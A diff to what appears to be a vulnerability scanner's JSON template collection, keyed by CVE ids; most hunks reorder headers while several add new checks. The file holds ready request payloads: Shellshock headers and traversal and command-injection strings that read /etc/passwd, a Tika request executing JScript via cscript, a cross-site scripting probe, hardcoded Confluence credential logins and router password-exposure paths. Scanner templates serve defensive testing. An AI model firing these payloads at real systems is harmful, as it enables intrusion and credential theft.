@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6403,11 +6403,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -7244,6 +7244,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-19877",
+      "info": {
+        "name": "Adiscon LogAnalyzer 4.1.7 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/src/login.php?referer=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E"
           ]
         }
       ]
@@ -9786,8 +9801,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11126,8 +11141,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11572,9 +11587,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -18914,6 +18929,20 @@
       ]
     },
     {
+      "id": "CVE-2022-26138",
+      "info": {
+        "name": "Questions For Confluence - Hardcoded Credentials",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /dologin.action HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nos_username={{os_username}}&os_password={{os_password}}&login=Log+in&os_destination=%2Fhttpvoid.action\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-26148",
       "info": {
         "name": "Grafana & Zabbix Integration - Credentials Disclosure",
@@ -19178,7 +19207,7 @@
       "requests": [
         {
           "raw": [
-            "POST /conf_mail.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n"
+            "@timeout: 25s\nPOST /conf_mail.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n"
           ]
         }
       ]
@@ -19378,6 +19407,21 @@
       ]
     },
     {
+      "id": "CVE-2022-32409",
+      "info": {
+        "name": "i3geo - Directory Traversal",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-32444",
       "info": {
         "name": "u5cms v8.3.5 - Open Redirect",
@@ -19402,6 +19446,34 @@
         {
           "raw": [
             "GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1\nHost: {{Hostname}}\nCookie: tmpToken=;\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34046",
+      "info": {
+        "name": "Wavlink Sysinit.shtml - Password Exposure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /sysinit.shtml?r=52300 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34047",
+      "info": {
+        "name": "Wavlink Set_safety.shtml - Password Exposure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /set_safety.shtml?r=52300 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
